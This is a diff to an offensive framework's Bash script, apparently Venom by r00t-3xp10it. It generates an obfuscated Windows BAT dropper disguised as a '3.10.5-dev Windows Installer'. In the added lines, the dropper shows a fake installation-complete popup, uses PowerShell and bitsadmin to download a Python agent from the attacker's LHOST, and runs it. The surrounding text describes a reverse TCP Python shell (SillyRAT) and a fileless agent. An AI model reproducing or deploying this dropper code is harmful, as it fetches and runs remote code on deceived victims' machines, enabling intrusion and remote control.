@@ -10288,11 +10288,12 @@ if [ -z "$Drop" ]; then Drop="Procmom";fi
 wvd=$(echo $rpath|sed "s|^[%]|\$env:|"|sed "s|%||") # <- new
 if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
-   uploadpath="$rpath => (remote)"
-   lolbin="Powershell (DownloadFile)"
+   uploadpath="$rpath => ($wvd)"
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
+      lolbin="bitsadmin (DownloadFile)"
       dropperpath="$IPATH/output/$Drop.bat"
    else
+      lolbin="Powershell (DownloadFile)"
       dropperpath="$IPATH/output/$Drop.exe"
    fi
 elif [ "$SOSP" = "Linux" ]; then
@@ -10301,10 +10302,10 @@ elif [ "$SOSP" = "Linux" ]; then
    lolbin="wget (DownloadFile)"
    dropperpath="$IPATH/output/$Drop"
 else # Mac or multi-platforms
-   lolbin="Direct Download (url)"
+   lolbin="http => MegaUpload.html"
    targetos="Multi-Platforms"
-   uploadpath="NULL (Client manual execution)"
-   dropperpath="NULL (pure python Client exec)"
+   uploadpath="NULL => Client.py manual execution"
+   dropperpath="NULL => Client.py manual execution"
 fi
 
 
@@ -10314,7 +10315,7 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    TARGETOS : ($targetos distros)
+    TARGETOS : $targetos distros
     LOLBin   : $lolbin
     DROPPER  : $dropperpath
     AGENT    : $IPATH/output/$Drop.py
@@ -10334,12 +10335,12 @@ if [ "$SOSP" = "Windows" ]; then
       echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
       echo ":: Framework: Venom v1.0.17 - shinigami" > $Drop.bat
       echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.bat
-      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set #?=." >> $Drop.bat
+      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1&&set \$i=py&&set #?=." >> $Drop.bat
       echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $Drop.bat
       echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
-      echo "@Po%@i%wE^r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",4,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
-      echo "@pOw^e%@%rS^hE%@_%lL %\$\$% bi%@$%t^sa%@i%dm%@f%in /t^ra%@%ns%@%f^er pu%@%r^pl%@%ete%@%a^m ht%@%tp:/%@%/$lhost/$Drop.%\$i% $wvd\\$Drop.%\$i%" >> $Drop.bat
-      echo "c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
+      echo "@Po%@i%w\"E\"r%@i%s^He%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjec%@_%t Wsc%d0b%rip^t%#?%She%@$%l^l)%#?%Po%#i%pu^p(\"\"\"Ins%@$%tala%@i%tio%@s%n Com%@s%ple%@$%te%@_%d.%#?%\"\"\",4,\"\"\"$Drop - 3%#?%10%#?%5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $Drop.bat
+      echo "@pOw^e%@%rS^h\"E\"%@_%lL %\$\$% bi%@$%t^s\"a\"%@i%d^m%@f%in %i()%/t^ra%@i%n\"s\"%@$%f^er pu%@%r^pl%@%e\"t\"e%@%a^m /do%@_%w^n%@i%l\"o\"%@#1%ad %(f$)%/p^ri%@$%or\"i\"%@i%ty fo%@$%r\"e\"g%@'%ro^u%@$%nd %-%ht%@%tp:/%@%/$lhost/$Drop.%\$i% $wvd\\$Drop.%\$i%" >> $Drop.bat
+      echo "@c%@$%d $rpath &%@%& =pY%@%t^H%@%o\"N\" $Drop.%\$i%" >> $Drop.bat
       echo "${BlueF}[☠]${white} Written $Drop.bat (obfuscated)"${Reset};sleep 2
 
    else
@@ -12327,7 +12328,7 @@ cat << !
     ─────────
     DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
     TARGET SYSTEMS     : Multi-Platforms (Linux|Mac|Windows)
-    LOLBin             : Powershell|Wget (DownloadFile)
+    LOLBin             : Powershell|bitsadmin|Wget (DownloadFile)
     DROPPER EXTENSION  : BAT
     AGENT EXTENSION    : PY
     AGENT PERSISTENCE  : NOT AVAILABLE
@@ -13683,7 +13684,7 @@ cat << !
     CNDOMAIN : $CN
     AGENT    : $IPATH/output/Client.ps1
     DROPPER  : $IPATH/output/$Drop.$Ext
-    UPLOADTO : FileLess (agent does not touch disk)
+    UPLOADTO : FileLess => agent does not touch disk
 !
 echo "---"
 
